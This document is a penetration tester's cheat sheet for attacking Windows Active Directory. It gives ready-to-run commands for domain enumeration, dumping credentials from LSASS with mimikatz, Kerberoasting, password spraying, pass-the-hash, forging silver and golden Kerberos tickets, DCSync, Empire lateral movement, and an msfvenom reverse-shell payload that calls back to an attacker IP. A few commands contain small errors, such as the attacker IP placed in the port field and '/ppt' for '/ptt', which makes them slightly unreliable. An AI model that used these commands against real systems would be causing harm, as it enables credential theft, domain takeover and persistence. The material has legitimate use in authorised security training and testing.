# Active Directory

---

- [Enumeration](#enumeration)
- [Authentication](#authentication)
- [Lateral Movement](#lateral-movement)
- [Persistence](#persistence)

<a name="enumeration"></a>
## Enumeration

Shows all local accounts.
```sh
net user
```

Show all users in entire domain.
```sh
net user /domain
```

Show additional information about a user including the Groups it is in, including Domain Admins.
```sh
net user john /domain
```

Shows all the groups on the domain.
```sh
net group /domain
```

Shows the domain account policy such as password restricts, lockouts etc.
```sh
net accounts
```

### Powershell Enumeration
LDAP Provider Path Format  
`LDAP://HostName[:PortNumber][/DistinguishedName]`

Get the hostname and the DistinguishedName components in Powershell.
```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

Domain name is the Name: property, and the domain controller name is the PdcRoleOwner: property. (lpad-path.ps1 script to generate LDAP Path).
`LDAP://DC01.example.com/DC=example,DC=com`

Import powerview in powershell, requires Admin.
```powershell
Import-Module .\PowerView.ps1
```

NetWkstaUserEnum
```powershell
Get-NetLoggedon
```

NetSessionEnum
```powershell
Get-NetSession
```

Get logged in users to client24
```powershell
Get-NetLoggedon -ComputerName client24
```

Get logged in users to domain controller dc01
```powershell
Get-NetSession -ComputerName dc01
```

<a name="authentication"></a>
## Authentication
### mimikatz
Mimikatz should be avoided using as a standalone application due to AV detection, instead use in memory with Powershell or dump the LSASS process memory with Task manager and move to another machine then load Mimikatz on that machine.

Engage SeDebugPrivlege
```sh
privilege::debug
```

Retrieve the cached password hashes
```sh
sekurlsa::logonpasswords
```

View the tickets stored in memory.
```sh
sekurlsa::tickets
```

Load the IdentifyModel namespace, then request the SPN in PowerShell
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/ExampleWebServer.corp.com'
```

Lists all cached Kerberos tickets for the current user
```sh
klist
```

### Downloading the ticket from memory
List the tickets in mimikatz
```sh
kerberos::list
```

Download tickets to disk. Can crack the password (Kerberoasting) on attacking machine.
```sh
kerberos::list /export
```

Script to automatically enumerate all SPN's, request tickets, export them and put them in format for cracking.
`Invoke-Kerberoast.ps1`

### Slow Password Guessing
Bruteforce all Admin accounts with the given password.
```sh
Spray-Passwords.ps1 -Pass password123 -Admin
```

<a name="lateral-movement"></a>
## Lateral Movement
Pass The Hash - Only works with NTLM hash. See the [Password Attacks](/{{route}}/{{version}}/password-attacks/windows) section.

### Overpass The Hash
Abuse NTLM user hash to gain Ticket Granting Ticket / Service Ticket.

### mimikatz
Runs a powershell which allows us to execute commands as john by turning a NTLM hash into a Kerberos ticket.
```sh
sekurlsa::pth /user:john /domain:example.com /ntlm:5311a63bac24a7c63a2ab53be3a135d /run:PowerShell.exe
```

Generates TGT by authenticating to network share on domain controller.
```sh
net use \\dc01
.\PsExec.exe \\dc01 cmd.exe
```

### Pass The Ticket
Silver Ticket - Create own service ticket with service account password or it's NTLM hash.

Displays the SID of the current user. (To get the SID of the domain, it is everything except the end -1116 (Which is the relative identifier [RID]).)
```sh
whoami /user
```

Remove any existing kerberos tickets in mimikatz.
```sh
kerberos::purge
```

Create the silver ticket in memory, rc4 is the NTLM of the service password and /ptt means to create it in memory.
```sh
kerberos::golden /user:john /domain:example.com /sid:S-1-5-21-4021956327-1617327991-43125789557 /target:ExampleWebServer.corp.com /service:HTTP /rc4:E2EA25A32AD1C9531152B52CE333A212 /ppt
```

### Distributed Component Object Model
DCOM objects related to Microsoft Office (Outlook / PowerPoint) allow lateral movement.

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "__VICTIM_IP__"))
$com | Get-Member
```

Create a macro in a Excel document, save as .xls (2003) then copy to the remote computer. (Through SMB with access as local admin).

Execute see excel-dcom.ps1.

Generate hta payload to get the powershell payload, IP address is the internal Windows 10 client ip address, the same interface as the server.
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=__ATTACKER_IP__ LPORT=__ATTACKER_IP__ -f hta-psh -o shell.hta
```

### PowerShell Empire
Attempts SMB exec to the new machine and creates an agent.
```sh
usemodule lateral_movement/invoke_smbexec
set Listener http
set ComputerName CLIENT24
set Username john
set Hash 5361A75FDF74ABA26A1AC1A4C32EB62A
set Domain example.com
```

<a name="persistence"></a>
## Persistence
### Golden Tickets
Once we have access to Domain Controller, we can get krbtgt hash to create custom Ticket Granting Tickets (Golden Ticket).


Dump the account hashes including krbtgt
```sh
lsadump::lsa /patch
```

Create a golden ticket with the krbtgt password. Any user is trusted with krbtgt hash so can use fake usernames.
```sh
kerberos::golden /user:fakeuser /domain:example.com /sid:S-1-5-21-4021956327-1617327991-43125789557 /krbtgt:af124b61f25971ed152b3cd552172aab /ptt
```

Launch command prompt
```sh
misc::cmd
```

### Domain Controller Synchronization
NTDS.dit = Dataabase file containing all Active Directory accounts.

Sync the Administrator user which contains the password hashes. This can be done for every user without logging into the domain controller.
```sh
lsadump::dcsync /user:Administrator
```